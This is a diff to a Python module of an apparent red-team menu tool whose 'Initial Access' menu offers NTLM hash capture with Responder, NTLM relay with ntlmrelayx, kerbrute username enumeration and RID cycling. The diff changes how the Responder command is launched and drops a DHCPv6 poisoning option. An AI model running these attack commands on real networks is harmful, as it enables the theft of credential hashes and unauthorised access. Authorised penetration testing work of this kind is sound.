@@ -8,12 +8,11 @@ from config.settings import SESSION
 
 def run():
     print_banner("INITIAL ACCESS", "No-Cred Network Attack Techniques")
-    iface = prompt("Network interface (e.g. eth0)")
+    iface = input_or_session("attacker_iface", "Network interface (e.g. eth0, tun0)")
 
     print(f"""
   [1]  NTLM Capture with Responder
   [2]  NTLM Relay (ntlmrelayx) — SMB/LDAP/LDAPS targets
-  [4]  DHCPv6 Poisoning (mitm6 → ntlmrelayx)
   [5]  Username Enumeration (kerbrute)
   [6]  SMB / LDAP Null Session Check
   [7]  RID Cycling (anonymous user enum)
@@ -23,7 +22,18 @@ def run():
 
     if c == "1":
         info("Starting Responder — captures NTLMv1/v2 hashes")
-        run_cmd(f"sudo responder -I {iface} -rdwv")
+        import subprocess as _sp
+        _tty_out = open("/dev/tty", "w")
+        _tty_in  = open("/dev/tty", "r")
+        _proc = _sp.Popen(["sudo", "responder", "-I", iface, "-Av"],
+                          stdin=_tty_in, stdout=_tty_out, stderr=_tty_out)
+        try:
+            _proc.wait()
+        except KeyboardInterrupt:
+            _proc.terminate()
+        finally:
+            _tty_out.close()
+            _tty_in.close()
 
     elif c == "2":
         dc      = prompt("DC IP")
